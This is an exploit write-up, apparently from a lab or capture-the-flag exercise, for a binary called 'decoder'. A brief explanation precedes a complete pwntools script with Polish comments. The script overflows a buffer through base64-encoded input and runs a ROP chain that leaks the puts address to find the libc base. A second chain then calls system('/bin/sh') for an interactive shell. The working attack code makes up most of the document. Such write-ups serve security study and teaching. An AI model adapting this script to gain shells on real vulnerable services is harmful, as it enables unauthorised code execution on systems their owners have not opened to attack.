# Writeup for exploit - `rune decoder`

## Goal

The goal was to exploit a gap in `decoder` software to perform an attack, which will:
1. Show the base address of `libc`.
2. Run the `/bin/sh` shell. 

### 1. Leak of `libc` location

To get the base address of `libc`, `puts()` function and GOT (Global Offset Table) were used.

### 2. Execution of `/bin/sh` shell

After getting the `libc` address the script calculated the address of `system()` function and found the `/bin/sh` path. Then it constructed a ROP chain, which:
- Put a pointer to `/bin/sh` in `RDI` registry.
- Executed `ret` instruction to then execute `system()` function.

## Exploit script

```python
#!/usr/bin/env python
from pwn import *

##### SPECIFY BINARY #####
elf = context.binary = ELF('../src/decoder')
libc = ELF('../src/lib/libc.so.6')

context.terminal = ['gnome-terminal', '--tab', '--']

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([elf.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        ##### SPECIFY SERVER AND PORT #####
        SERVER = 'localhost'
        PORT = 1337 
        return remote(SERVER, PORT, *a, **kw)
    else:
        return process([elf.path] + argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

import base64

io = start()

fill = b'A'*128  # Wypełnienie bufora

# Znalezienie adresów POP RDI i RET
POP_RDI = next(elf.search(asm("pop rdi; ret"), executable=True))
RET = next(elf.search(asm("ret"), executable=True))

# Pierwszy łańcuch ROP do wycieku adresu `libc`
ropchain = flat(
    POP_RDI,
    elf.got['puts'],
    elf.plt['puts'],
    elf.sym['_start']
)

payload = base64.b64encode(fill)
payload += b'===='*7  # Dodanie separatorów
payload += base64.b64encode(b'AA'+ropchain)

io.clean()
io.sendline(payload)
io.recvuntil(b'bye')
io.recvline()

# Odczytanie i obliczenie adresu `libc`
puts_leak = u64(io.recv(6).ljust(8, b'\x00'))
libc.address = puts_leak - libc.sym['puts']
log.success(f'libc base: {hex(libc.address)}')

# Przygotowanie drugiego łańcucha ROP do wykonania `/bin/sh`
BINSH = next(libc.search(b'/bin/sh\x00'))

ropchain2 = flat(
    POP_RDI,
    BINSH,
    RET,
    libc.sym['system']
)

payload = base64.b64encode(fill)
payload += b'===='*7
payload += base64.b64encode(b'AA'+ropchain2)

io.sendline(payload)

# Uzyskanie interaktywnej powłoki
io.interactive()
```